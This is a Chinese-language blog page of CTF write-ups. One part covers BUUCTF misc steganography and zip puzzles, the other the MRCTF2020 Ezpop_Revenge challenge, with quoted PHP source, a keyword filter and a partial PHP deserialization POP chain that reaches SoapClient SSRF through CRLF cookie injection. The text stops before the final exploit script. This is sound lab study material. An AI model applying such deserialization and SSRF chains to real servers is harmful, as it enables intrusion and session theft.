<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">260</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/13/NSSCTF-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">NSSCTF-phar反序列化</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-13</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/13/buu-missc/">buu-misc</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-13</time><div class="content"><p>忘记保存了，无语了，所以直接写一下解题思路</p>
<h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><p>选择analyze的frame browser</p>
<h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e 1.png</span><br></pre></td></tr></table></figure>

<p>只用zip密码爆破软件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013102808.png" alt="img" style="zoom:67%;"><br> <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013103515.png" alt="img" style="zoom:67%;"></p>
<h2 id="N种方式解决"><a href="#N种方式解决" class="headerlink" title="N种方式解决"></a>N种方式解决</h2><p>在网页中打开（写个html代码）</p>
<h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>很显然啊 图片长宽不对<br>在010中打开 调整长高<br>18、19位是长，22、23是宽<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013164208.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013164404.png" alt="img" style="zoom:67%;"></p>
<h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>010中打开 搜索flag 或拉到底</p>
<h2 id="基础破解-rar"><a href="#基础破解-rar" class="headerlink" title="基础破解 rar"></a>基础破解 rar</h2><p>使用rar破解工具</p>
<h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>看到RGB中的0通道上面有一行内容</p>
<p>先选择analyse -&gt;data extract-&gt;save bin保存为png 扫描一下<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013172408.png" alt="img" style="zoom:67%;"><br> <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013172421.png" alt="img" style="zoom:67%;"></p>
<h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><p>记事本打开（改后缀）</p>
<h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>就是这个zip</p>
<p>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包</p>
<p>一个 ZIP 文件由<strong>三个部分</strong>组成：</p>
<p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p>
<p><strong>压缩源文件数据区</strong>：</p>
<p>50 4B 03 04：这是头文件标记（0x04034b50）</p>
<p>14 00：解压文件所需 pkware 版本</p>
<p>00 00：全局方式位标记（有无加密）</p>
<p>08 00：压缩方式</p>
<p>5A 7E：最后修改文件时间</p>
<p>F7 46：最后修改文件日期</p>
<p>16 B5 80 14：CRC-32校验（1480B516）</p>
<p>19 00 00 00：压缩后尺寸（25）</p>
<p>17 00 00 00：未压缩尺寸（23）</p>
<p>07 00：文件名长度</p>
<p>00 00：扩展记录长度</p>
<p><strong>压缩源文件目录区</strong>：</p>
<p>50 4B 01 02：目录中文件文件头标记(0x02014b50)</p>
<p>3F 00：压缩使用的 pkware 版本</p>
<p>14 00：解压文件所需 pkware 版本</p>
<p>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</p>
<p>08 00：压缩方式</p>
<p>5A 7E：最后修改文件时间</p>
<p>F7 46：最后修改文件日期</p>
<p>16 B5 80 14：CRC-32校验（1480B516）</p>
<p>19 00 00 00：压缩后尺寸（25）</p>
<p>17 00 00 00：未压缩尺寸（23）</p>
<p>07 00：文件名长度</p>
<p>24 00：扩展字段长度</p>
<p>00 00：文件注释长度</p>
<p>00 00：磁盘开始号</p>
<p>00 00：内部文件属性</p>
<p>20 00 00 00：外部文件属性</p>
<p>00 00 00 00：局部头部偏移量</p>
<p><strong>压缩源文件目录结束标志</strong>：</p>
<p>50 4B 05 06：目录结束标记</p>
<p>00 00：当前磁盘编号</p>
<p>00 00：目录区开始磁盘编号</p>
<p>01 00：本磁盘上纪录总数</p>
<p>01 00：目录区中纪录总数</p>
<p>59 00 00 00：目录区尺寸大小</p>
<p>3E 00 00 00：目录区对第一张磁盘的偏移量</p>
<p>00 00：ZIP 文件注释长度</p>
<p>因此，根据此题目来看： </p>
<p>压缩源文件数据区：50 4B 03 04：这是头文件标记<br>然后我们直接搜索加密方式<br>0900 说明是有加密，0800说明无加密</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014141943.png" alt="img"></p>
<p>接下来使用其他解压软件打开就行了，这里用得是winrar</p>
<h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p>直接搜索flag就行了</p>
<h2 id="镜子里的世界"><a href="#镜子里的世界" class="headerlink" title="镜子里的世界"></a>镜子里的世界</h2><p>使用stegslove 打开，点击extract preview功能，选取最低0通道，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014143253.png" alt="img" style="zoom: 80%;"><br>打开即可看到flag</p>
<h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>在010editor中发现信息<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014143814.png" alt="img" style="zoom:67%;"></p>
<p>使用分离工具分离一下<br>然后zip密码爆破一下</p>
<h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014145956.png" alt="img" style="zoom:50%;">
应该又是要分离一下文件，分离 以后需要密码，再回去看 发现010editor有说
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014153055.png" alt="img" style="zoom:67%;">

<h2 id="escape-cap"><a href="#escape-cap" class="headerlink" title="escape cap"></a>escape cap</h2><p>追踪tcp流即可</p>
<h2 id="另一个世界"><a href="#另一个世界" class="headerlink" title="另一个世界"></a>另一个世界</h2><p>文件尾巴，然后二进制转字符串即可z</p>
<h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p>图片隐写 使用010打开，直接点击搜索类型——text，然后点击搜索flag即可</p>
<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>steg打开，使用bin保存，然后保存为zip，解压以后得到的文件，使用010打开，然后搜索{<br>就可以找到flag<br><strong>这里说一下思路</strong>感觉没有提示，单纯让你就是硬试？所以小结一下</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>遇到图片——010editor打开试试，全局搜索flag、txt、zip等文件，如果有，就去分离，没有的话就考虑是否隐藏在LSB中，所以分离0通道导出为bin，然后尝试，也许是jpg，也许是txt，也许是zip，主要看文件头，像这题<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014160407.png" alt="img" style="zoom:67%;"><br>504b0304明显是zip的文件头，所以保存为zip</p>
<h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014160952.png" alt="img" style="zoom: 67%;">
下面应该是压缩包的密码，但是没看懂是干个啥
原来是盲文表。。。对照一下:

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kmdonowg</span><br></pre></td></tr></table></figure>

<p>得到了一个音频，听起来就是个莫斯电码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-.-. - …-. .-- .–. . … ----- —… --… …-- …— …–… …— …-- -… --…</span><br></pre></td></tr></table></figure>

<p>flag{wpei08732?23dz}</p>
<h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>爆破一下<br><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a><br>brainfuck加密，解密一下:</p>
<h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>要我们找webshell文件，这里可以使用linux系统的查找文件内容指令，或者使用D盾，这里试一下D盾，因为D盾后续还可用于awd查找shell文件<br> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014164727.png" alt="img" style="zoom:67%;"></p>
<h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><p>在流量包中可以看到一个很长的东西，感觉是有问题的base64解码一下，可以发现是一个JFIF文件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014173329.png" alt="img" style="zoom:67%;"></p>
<p>此网站解码可以直接转成文件<br><a target="_blank" rel="noopener" href="https://the-x.cn/base64">https://the-x.cn/base64</a></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014174450.jpg" alt="img" style="zoom:67%;">

<h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>RouterPassView查看后，搜索username或者password</p>
<h2 id="MISC-来首歌吧"><a href="#MISC-来首歌吧" class="headerlink" title="MISC 来首歌吧"></a>MISC 来首歌吧</h2><p>莫斯密码</p>
<h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>binwalk分离一下文件，可以得到一个压缩文件，zip伪加密，然后将0900改为0800</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014181310.png" alt="img"></p>
<p>然后再linux解压这个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z x flag.vmdk -o.&#x2F;</span><br></pre></td></tr></table></figure>

<p>找到 key_part_one 里的 NUL文件 和 key_part_two 里的 where_is_flag_part_two.txt:flag_part_two_is_here.txt<br>注意:windows下解压不会有&lt;where_is_flag_part_two.txt:flag_part_two_is_here.txt这个文件 只有linux用命令解压才会有<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45485719/article/details/107417878">https://blog.csdn.net/weixin_45485719/article/details/107417878</a><br>就可以发现有如下文件:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014181800.png" alt="img" style="zoom:67%;"></p>
<p>这里是解密网址:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.splitbrain.org&#x2F;services&#x2F;ook</span><br></pre></td></tr></table></figure>

<p>flag{N7F5_AD5_i5_funny!}</p>
<h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h2><p>010打开，发现flag.txt，然后去kali分离一下得到一个压缩包需要密码</p>
<p>然后又得到一张照片，，啥信息也没看到，原来是需要一个新的工具:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">steghide</span><br><span class="line">将secret.txt文件隐藏到text.jpg中：</span><br><span class="line"># steghide embed -cf test.jpg -ef secret.txt -p 123456</span><br><span class="line"></span><br><span class="line">从text.jpg解出secret.txt:</span><br><span class="line">#steghide extract -sf test.jpg -p 123456</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「Blood_Seeker」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;Blood_Seeker&#x2F;article&#x2F;details&#x2F;81837571</span><br></pre></td></tr></table></figure>

<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>为了校赛做了一下misc，单纯学一下基本操作:<br>1.压缩文件:zip:考虑zip爆破，或者zip伪加密<br>   rar:使用rar爆破密码工具<br>2.图片——隐写：<br>010打开，直接搜索flag、txt、jpg等，看看有没有隐藏，分离一下<br>steg工具，lsb的0通道合成一下导出为bin 看一下文件头是个啥，保存为特定的文件就行了</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/10/MRCTF2020/">MRCTF2020</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-10</time><div class="content"><h2 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h2><p><a target="_blank" rel="noopener" href="http://www.zip源码泄露,下载下来审计一下,有一个flag.php,看起来是需要ssrf漏洞的因为需要你访问的来源是127.0.0.1/">www.zip源码泄露，下载下来审计一下，有一个flag.php，看起来是需要SSRF漏洞的因为需要你访问的来源是127.0.0.1</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;我扌your problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>毕竟是框架题，看了一下，应该是要反序列化找ssrf的漏洞的位点然后去打，全局搜索一下反序列化函数，可以发现，我们传入的coincidence[‘hello’], $this-&gt;coincidence[‘world’]会被分为两个部分传入Typecho_Db</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;world&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_Plugin</span> <span class="keyword">implements</span> <span class="title">Typecho_Plugin_Interface</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;admin&#x27;</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) &#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/file|assert|eval|[`\&#x27;~^?&lt;&gt;$%]+/i&quot;</span>,base64_decode($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) === <span class="number">0</span>)</span><br><span class="line">				unserialize(base64_decode($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>]));</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;Not that easy.&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>传入之后，在这里进行进行了一个拼接,并在最后实例化了这个类,可以看到这里提示了一个tostring<br>方法，所以我们就去找找Typecho_Db，看看是否有这个tostring方法，可以进行操作</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$adapterName, $prefix = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">       $adapterName = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);<span class="comment">//__toString()</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">       <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">       <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//实例化适配器对象</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以发现，这里有一个tostring方法可以进行操作，其实链子到这里就似乎已经断了，但是该如何实现ssrf呢？就要想到一个php的内置类soapclient，而这里有个点，_adapter-&gt;parseSelect，如果将adapter赋值为这个类，那么就会调用这个类中不存在的方法，相当于触发了其中的call函数，并且这里还有可控的参数供我们写入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> KEYWORDS = <span class="string">&#x27;*PRIMARY|AND|OR|LIKE|BINARY|BY|DISTINCT|AS|IN|IS|NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> $_default = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;action&#x27;</span> =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;table&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;fields&#x27;</span> =&gt; <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;join&#x27;</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">        <span class="string">&#x27;where&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;limit&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;offset&#x27;</span> =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;order&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;group&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;having&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;rows&#x27;</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">private</span> $_prefix;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="string">&#x27; VALUES &#x27;</span></span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                $columns = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                        $columns[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;UPDATE &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27; SET &#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, $columns)</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>梳理一下pop链的逻辑<br>1.HelloWorld_Plugin为pop链反序列化的入口，跳转至HelloWorld_DB类中进行Typecho_Db进行一个初始化，并通过concidence传入数值<br>2.通过tostring跳转至Typecho_Db的tostring魔术方法中<br>3.针对adatpter的一个调用赋值为sopa类并进行sopa类的call方法的调用，最后利用这个call方法进行一个ssrf发送报文实现flag的获取</p>
<p>所以初步的一个pop链就是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence=<span class="keyword">array</span>(<span class="string">&quot;hello&quot;</span>=&gt;<span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild=<span class="keyword">array</span>(<span class="string">&quot;action&quot;</span>=&gt;<span class="string">&quot;SELECT&quot;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter=<span class="keyword">new</span> SoapClient;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是我们要将flag带出来，还需要吧自己的phpsessid传过来，然而soap并不能设置cookie，因此需要crlf，soapclient可以这只ua，只要在ua后加上\r\nCookie：PHPSESSID=xxx,就可以为http头添加一个新的cookie字段，这样就可以带出session了，最后就是寻找一下其中的路由即可，<br>在/var/Typecho/Plugin.php 就有如下路由</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> */</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span>(<span class="params">$pluginName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">self</span>::$_plugins[<span class="string">&#x27;activated&#x27;</span>][$pluginName] = <span class="built_in">self</span>::$_tmp;</span><br><span class="line">    <span class="built_in">self</span>::$_tmp = <span class="keyword">array</span>();</span><br><span class="line">    Helper::addRoute(<span class="string">&quot;page_admin_action&quot;</span>,<span class="string">&quot;/page_admin&quot;</span>,<span class="string">&quot;HelloWorld_Plugin&quot;</span>,<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是在后面看了题解，发现这题有一个坑，就是这里private属性不能单纯的使用%00绕过需要将其转为十六进制才行<br>所以最终的脚本如下:</p>
